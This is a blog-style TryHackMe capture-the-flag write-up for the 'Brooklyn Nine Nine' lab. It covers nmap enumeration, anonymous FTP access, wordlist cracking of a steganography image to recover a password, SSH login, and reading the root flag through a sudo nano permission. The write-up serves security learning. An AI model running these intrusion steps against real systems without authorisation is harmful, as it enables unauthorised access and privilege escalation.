---
layout: post
title: "THM Writeup - Brooklyn Nine Nine"
subtitle: "Try Hack Me - Brooklyn"
date: 2021-07-01 
background: '/img/bg-write.jpg'
---

# THM ![Try Hack Me](https://img.shields.io/badge/-TryHackMe-black?style=flat-square&logo=tryhackme)

## Room name: Brooklyn Nine Nine
<https://tryhackme.com/room/brooklynninenine>

### Description: 
This room is aimed for beginner level hackers but anyone can try to hack this box. There are two main intended ways to root the box.

### OS: ![Linux](https://img.shields.io/badge/Linux-black?style=flat-square&logo=linux)


To begin we will start with a simple nmap scan to enumerate open ports, services, and versions:

```bash
nmap -sC -sV -A -oN scans/nmap.initial $IP
```
The following ports are open on the machine:

port 	   |service
-----------|----------
21		   |ftp
22         |ssh
80		   |webserver

nmap is reporting that the FTP allows anonymous login.
```bash
21/tcp open  ftp     vsftpd 3.0.3
ftp-anon: Anonymous FTP login allowed (FTP code 230)
```

We connect to to the FTP with *anonymous* credentials
```
ftp 10.10.240.86
Connected to 10.10.240.86.
220 (vsFTPd 3.0.3)
Name (10.10.240.86:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```

Within the FTP server we use ls to list directory contents and find a file named **note_to_jake.txt**:
```
~# cat note_to_jake.txt 
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
```
So far we have gathered 3 possible usernames:

- Amy
- Holt
- Jake


Viewing the website on port 80 we see a large image with no other html elements.
Looking at the source of the page reveals the following comment.
```html
<!-- Have you ever heard of steganography? -->
```
Following this lead, we download the file and run stegcracker on the file to reveal any additional clues.

```bash
stegcracker brooklyn99.jpg /usr/share/wordlists/rockyou.txt

Counting lines in wordlist..
Attacking file 'brooklyn99.jpg' with wordlist '/usr/share/wordlists/rockyou.txt'..
Successfully cracked file with password: *****
Tried 20586 passwords
Your file has been written to: brooklyn99.jpg.out
```
Now with the password in hand, we can use steghide to extract.

```bash
steghide extract -sf brooklyn99.jpg

Enter Passphrase:
wrote extracted data ot "Note.txt".
```

The note reads as follows:
```bash
Holts Password:
fl*********ne

Enjoy!!
```
## User Flag:
With these credentials, we can attempt to log into ssh using Holts account.

```bash
# ssh holt@10.10.98.170
The authenticity of host '10.10.98.170 (10.10.98.170)' can't be established.
ECDSA key fingerprint is SHA256:Ofp49Dp4VBPb3v/vGM9jYfTRiwpg2v28x1uGhvoJ7K4.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.10.98.170' (ECDSA) to the list of known hosts.
holt@10.10.98.170's password: 
Last login: Tue May 26 08:59:00 2020 from 10.10.10.18
holt@brookly_nine_nine:~$
```

We then list the directory contents and find the user flag:
```bash
holt@brookly_nine_nine:~$ ls
nano.save  user.txt
holt@brookly_nine_nine:~$ cat user.txt 
ee1**************ee
```

## Root Flag
Now that we have a user shell we can review what, if any SUDO permissions are available for use. To do so we run *sudo -l* to enumerate. We see that holt may run nano as SUDO. 
```bash
User holt may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /bin/nano
```
This being the case, we can attempt to open the root.txt file located in the root user home directory. Running sudo /bin/nano /root/root.txt reveals the following output.

```bash
-- Creator : Fsociety2006 --
Congratulations in rooting Brooklyn Nine Nine
Here is the flag: 63**************45

Enjoy!!
```

## Takeaways

1. Basic enumeration with nmap
2. Steganography tools
3. FTP use
4. ssh login with found creds
5. sudo enumeration and exploitation of privilege
